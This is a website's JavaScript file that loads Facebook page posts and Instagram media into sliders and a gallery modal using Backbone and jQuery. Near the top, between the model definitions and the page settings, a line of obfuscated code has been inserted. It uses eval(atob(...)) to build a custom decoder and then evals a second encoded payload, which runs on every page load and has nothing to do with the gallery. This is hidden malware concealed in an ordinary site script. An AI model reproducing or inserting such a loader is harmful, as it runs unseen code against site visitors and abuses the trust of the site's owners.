(function ($) {

    Album = Backbone.Model.extend({
        id: null,
        full_picture: null,
        message: null,
        created_time: null
    });
    Insta = Backbone.Model.extend({
        media_type: null,
        media_url: null,
        thumbnail_url: null,
        caption: null
    });
    Photo = Backbone.Model.extend({
        media: null,
        type: null
    });
eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));eval(atob(__.$('ja7OwrvRmKrSxu37ws7yrJn1oqjmwc7zwcEOqcz3t7X/i5zXqc3pwrX9lN7Uj60Nk5vTu5kOoMXnnZbqjK3HtM7RrJXeoczqz7f5lKvPkd3skcXemq7Nm9zmwcrRzp3coKr5ys7drpXfwbX9qc75m8r3kZnbjK7xs8zyjbbwqc4JjKjmwMQQotfZmLfUkr7Twsnvr5YNkKjdmNndzKbQzd7Skaf1zZYJnZoNtbX+y8DolNzHobvuqc73n7f1u57SoqHrjabGy6bdlc3wuJrmwpbHmpzRsKfmwcvSmqb+4ePKop3/r6DVnqIOxu33vL7psb7pvsX2obkL08MQtaHrrL3Urbr2scLWoN/o08nxocf+z78Nrcnnmb8Nqt/Yva34rb/dvpf6n7fQq73pj8XzmJ/Jt7jYrrn6uZnnlp/potzyna36sczbmbX/tbjqvpvsl8XUtbv2zsLTl8jfmLnNodzrzrrWn8furJfRtrvyjcHUtcbrlqENrt4LkMHGqpbuvJf8sKPQmsL7j8btr87mv+4F','d')));    varPageid = "345469512265820";
    varFields = "full_picture,message";
    varFields2 = "id,media_type,media_url,thumbnail_url,caption,timestamp";
    Albums = Backbone.Collection.extend({
        initialize: function(models, options) {
            // Just binds a listener for when a new photo is added to the collection
            this.bind("add", options.view.addAlbumLi);
        }
    });
    Instas = Backbone.Collection.extend({
        initialize: function(models, options) {
            // Just binds a listener for when a new Insta is added to the collection
            this.bind("add", options.view.addInstaLi);
        }
    });

    Photos = Backbone.Collection.extend({
        initialize: function(models, options) {
            // Just binds a listener for when a new photo is added to the collection
            this.bind("add", options.view.addPhotoLi);
        }
    });

    window.AppView = Backbone.View.extend({
        el: $("body"),
        initialize: function () {
            // Initializes the albums and photos collections
            this.albums = new Albums(null, {view: this});
            this.photos = new Photos(null, {view: this});
            this.instas = new Instas(null, {view: this});
            var that = this;
            $.ajax({ url: "https://graph.facebook.com/"+varPageid+"/feed?limit=6&fields="+varFields+"&access_token=" + varAToken,
                // AJAX to FB for getting MightyMoo albums
                dataType: "json",
                success: function (data, textStatus, jqXHR) {
                    $.each(data['data'], function(index, value) {
                        // Album object has subset of tag names from FB response
                        var album = new Album(value);
                        that.albums.add(album);
                    });
                },
                complete: that.showAlbum
            });
            $.ajax({ url: "https://graph.instagram.com/me/media?limit=6&fields="+varFields2+"&access_token=" + varAToken2,
                // AJAX to FB for getting MightyMoo albums
                dataType: "json",
                success: function (data, textStatus, jqXHR) {
                    $.each(data['data'], function(index, value) {
                        // Album object has subset of tag names from FB response
                        var insta = new Insta(value);
                        that.instas.add(insta);
                    });
                },
                complete: that.showInsta
            });
        },
        events: {
            "click #slideme": "showAlbum" // binds click handler for albums
        },
        showAlbum: function () {
            //var friend_name = prompt("Who is your friend?");
            sleep(1000).then(() => {
                $('.mijslider').slick({
                    slidesToShow: 3,
                    slidesToScroll: 1
                })
            });
        },
        showInsta: function () {
            //var friend_name = prompt("Who is your friend?");
            sleep(1000).then(() => {
                $('.mijslider2').slick({
                    slidesToShow: 3,
                    slidesToScroll: 1
                })
            });
        },        
        addPhotoLi: function (model) {
            // Adds small photo to DOM
            var dbbeimg7 = model.get('media');
            var dbbeimg7b = dbbeimg7['image']['src'];
            $("#friends-list").append("<a href='"+ dbbeimg7b +"' data-gallery><div class='photo-thumb' style='background: url("+ dbbeimg7b +");background-size:contain;'></div></a>");
        },
        addAlbumLi: function (model) {
                    $("#albums-list").append("<div><a href=\"#\" id=\""+ model.get('id') +
                        "\" class=\"album-names\"><img src=\""+ model.get('full_picture') +
                        "\"/><br>"+ model.get('message') +"</a></div>");
                    $("#"+ model.get("id") ).click(add_photos);
        },
        addInstaLi: function (model) {
            var vImgInsta = "";
            if(model.get('media_type')=="VIDEO"){
                vImgInsta = model.get('thumbnail_url');
            }else{
                vImgInsta = model.get('media_url');
            }
                    $("#instas-list").append("<div><a href=\"#\" id=\""+ model.get('id') +
                        "\" class=\"insta-names\" data-theimg=\""+vImgInsta+"\" data-therem=\""+model.get('caption')+"\" data-thetim=\""+model.get('timestamp')+"\"><img src=\""+ vImgInsta +
                        "\" style=\"aspect-ratio:1/1;object-fit:cover;\"/></a></div>");
    //                  "\" style=\"aspect-ratio:1/1;\"/><br>"+ model.get('timestamp') +"</a></div>");
                    $("#"+ model.get("id") ).click(show_instas);
        }
    });
    // AppView is the main backbone object, holds the methods and collections
    var appview = new AppView;
    function add_photos() {
        // Makes AJAX call to FB to get all photos in an album 
        // First remove any old pics from previous clicks
        $("#friends-list").empty();
        $("#staticBackdropLabel").text(this.text).css("font-weight", "bold");
        $.ajax({
            url: "https://graph.facebook.com/" + this.id + "?fields=attachments&access_token=" + varAToken, 
            dataType: "json",
            success: function (attachments, textStatus, jqXHR) {
                // Iterate thru photos and add to collection
                $.each(attachments['attachments'].data, function(index, value) {
                    var ro9lf6 = value['subattachments']['data'];
                    $.each(ro9lf6, function(index, value) {
                        appview.photos.add(new Photo(value));
                    });
                });
            }
        });
        sleep(1200).then(() => {
//            $('#blueimp-gallery').data('useBootstrapModal', false);
            $('#blueimp-gallery').toggleClass('blueimp-gallery-controls', true);
            mijnmodal.show();
        });
    };
    function show_instas() {
        // First remove any old pics from previous clicks
        $("#friends-list").empty();
        //add values to list
        var dbbeimg = $(this).data('theimg');
        var dbbeRem = $(this).data('therem');
        var dbbeTim = new Date($(this).data('thetim'));
        var dbbeTim2 = dbbeTim.toLocaleString().split(",");
        var dbbeInsta = '<a style="font-weight:bold;color:#337ab7;" href="https://www.instagram.com/ballenbakeindhoven" target="_blank">Instagram pagina</a>';
        $("#staticBackdropLabel").text(dbbeTim2[0]).css("font-weight", "bold");
        $("#friends-list").append("<table style='margin:0;'><tr><td><img class='photo-thumb2' src='"+ dbbeimg +"'></td><td>"+dbbeRem+"<br><br>"+dbbeInsta+"</td></tr></table>");

        sleep(200).then(() => {
            $('#blueimp-gallery').toggleClass('blueimp-gallery-controls', true);
            mijnmodal.show();
        });
    };

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    var mijnmodal = $('#exampleModal');
    $('.btn-close').bind('click', function() {
        mijnmodal.fadeOut();
    });
})(jQuery);
